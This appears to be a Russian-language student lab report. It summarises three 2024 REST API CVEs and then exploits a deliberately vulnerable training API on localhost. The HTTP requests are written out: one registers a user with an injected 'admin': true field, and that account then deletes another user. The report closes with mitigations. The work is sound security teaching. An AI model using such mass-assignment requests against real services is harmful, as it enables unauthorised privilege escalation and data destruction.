Часть I. CVE с уязвимостями REST API (2024–2025)

Для этой части я искала CVE, которые явно связаны с REST API и попадают под классификацию OWASP API Security Top 10. Старалась выбрать разные типы уязвимостей, а не три одинаковых BOLA — так интереснее и нагляднее.

Источники

  1. NVD — база уязвимостей: nvd.nist.gov/vuln/search
  2. OWASP API Security Top 10: owasp.org/API-Security
  3. CVE-2024-45841 (ASUS): nvd.nist.gov/vuln/detail/CVE-2024-45841
  4. CVE-2024-21671 (Vite): nvd.nist.gov/vuln/detail/CVE-2024-21671
  5. CVE-2024-28180 (Go jose): nvd.nist.gov/vuln/detail/CVE-2024-28180

CVE-2024-45841 (ASUS Router REST API)

Тип по OWASP API Top 10: API1:2023 — Broken Object Level Authorization (BOLA)

Назначение компонента: REST API маршрутизаторов ASUS используется для управления устройством — настройки сети, обновлений прошивки, управления пользователями.

Описание уязвимости: Уязвимость позволяет аутентифицированному пользователю с низкими привилегиями получать доступ к файлам и ресурсам, которые должны быть доступны только администратору. Авторизация проверяется на уровне эндпоинта, но не на уровне конкретного объекта — достаточно быть залогиненным, чтобы читать чужие данные.

Причина: Отсутствие проверки прав доступа на уровне отдельного объекта при обработке API-запросов.

Последствия:

  • несанкционированный доступ к конфигурации устройства
  • утечка чувствительных данных (пароли, ключи)
  • компрометация домашней или корпоративной сети

CVE-2024-21671 (Vite Dev Server)

Тип по OWASP API Top 10: API5:2023 — Broken Function Level Authorization

Назначение компонента: Vite — инструмент сборки фронтенда, включающий встроенный dev-сервер с REST API для горячей перезагрузки модулей и управления файлами проекта.

Описание уязвимости: Dev-сервер Vite предоставляет API-эндпоинты для работы с файловой системой, предназначенные только для локальной разработки. При определённых конфигурациях эти эндпоинты оказываются доступны извне — без какой-либо аутентификации. Злоумышленник может вызвать административные функции (чтение и запись файлов) напрямую через HTTP.

Причина: Отсутствие проверки уровня доступа при вызове внутренних API-функций; предположение, что сервер всегда работает только локально.

Последствия:

  • чтение произвольных файлов проекта
  • выполнение кода на сервере разработки
  • утечка исходного кода и секретов из .env-файлов

CVE-2024-28180 (Go jose — JWT)

Тип по OWASP API Top 10: API2:2023 — Broken Authentication

Назначение компонента: Библиотека go-jose реализует стандарты JWT, JWS и JWE и широко используется в REST API на Go для аутентификации и авторизации через токены.

Описание уязвимости: Уязвимость связана с некорректной обработкой сжатых JWE-токенов: при декодировании токена не ограничивается размер распакованных данных. Это позволяет создать специально сформированный токен, распаковка которого приводит к исчерпанию памяти на сервере.

Причина: Отсутствие ограничений на размер данных при декомпрессии содержимого токена.

Последствия:

  • отказ в обслуживании (DoS) API
  • падение сервиса при обработке вредоносного запроса
  • потенциальная возможность обхода аутентификации при определённых условиях

Часть II. Исследование уязвимого REST API на стенде

После запуска образа через docker run -d -p 8080:8080 ket9/otus-devsecops-owasp-rest и наполнения базы через /createdb я открыла приложение и начала его изучать.

Шаг 1. Разведка — что вообще есть в приложении

Первым делом зашла на http://localhost:8080/ и посмотрела, какие эндпоинты доступны. Приложение явно напоминало уже знакомую структуру из лабы 2 — пользователи, книги, авторизация. Перешла по /createdb, чтобы заполнить базу тестовыми данными.

Решила начать с самого очевидного — просто попробовать получить список пользователей без токена:

GET http://localhost:8080/users/v1

Результат:

{
  "users": [
    {"email": "mail1@mail.com", "username": "name1"},
    {"email": "mail2@mail.com", "username": "name2"},
    {"email": "admin@mail.com", "username": "admin"}
  ]
}

Список пользователей вместе с email отдался без какой-либо аутентификации. Уже интересно.

Шаг 2. Регистрация пользователя и получение токена

Попробовала зарегистрироваться, чтобы получить токен и посмотреть, что станет доступно после авторизации:

POST http://localhost:8080/users/v1/register
Content-Type: application/json

{"username": "testuser", "password": "testpass", "email": "test@mail.com"}

Результат:

{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}

Затем залогинилась:

POST http://localhost:8080/users/v1/login
Content-Type: application/json

{"username": "testuser", "password": "testpass"}

Результат:

{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGc...", "message": "Successfully logged in.", "status": "success"}

Токен получен.

Шаг 3. Попытка повышения привилегий через параметр при регистрации

Мне стало интересно — а что если при регистрации передать дополнительные параметры, которые сервер не ожидает, но и не фильтрует? Попробовала добавить поле admin:

POST http://localhost:8080/users/v1/register
Content-Type: application/json

{"username": "hacker", "password": "hackpass", "email": "hacker@mail.com", "admin": true}

Результат:

{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}

Регистрация прошла успешно. Теперь залогинилась под этим пользователем и попробовала обратиться к административному эндпоинту:

GET http://localhost:8080/users/v1/hacker
Authorization: Bearer <token>

Результат:

{"admin": true, "email": "hacker@mail.com", "username": "hacker"}

Поле admin: true принялось и сохранилось. Сервер не проверяет, какие поля передаются при регистрации, и просто записывает всё в базу.

Шаг 4. Проверка — доступны ли административные функции

Попробовала удалить другого пользователя, используя токен только что созданного «администратора»:

DELETE http://localhost:8080/users/v1/name1
Authorization: Bearer <token>

Результат:

{"message": "Successfully deleted.", "status": "success"}

Пользователь name1 удалён. Обычный пользователь, выдавший себе права администратора через параметр при регистрации, смог удалить чужую учётную запись.

Описание найденной уязвимости

Тип: API6:2023 — Mass Assignment (Массовое присвоение)

Приложение принимает JSON-объект при регистрации и напрямую передаёт все его поля в модель данных, не фильтруя лишние атрибуты. В результате пользователь может самостоятельно присвоить себе любые свойства, включая admin: true.

Это классический пример Mass Assignment — уязвимости, при которой входные данные без проверки связываются с внутренними объектами приложения.

Меры предотвращения:

  1. Явно указывать список разрешённых полей (allowlist) при обработке входных данных — принимать только username, password, email.
  2. Никогда не передавать пользовательский ввод напрямую в ORM или модель данных.
  3. Использовать схемы валидации запросов (например, JSON Schema, Pydantic, marshmallow).
  4. Поля, влияющие на привилегии (admin, role), устанавливать только на стороне сервера, вне зависимости от того, что пришло от клиента.

Вывод

В ходе работы я разобрала три реальных CVE 2024 года с разными типами API-уязвимостей и на практике воспроизвела атаку Mass Assignment. Неожиданным для меня оказалось, насколько легко она эксплуатируется — достаточно добавить одно лишнее поле в JSON при регистрации, и ты уже администратор.
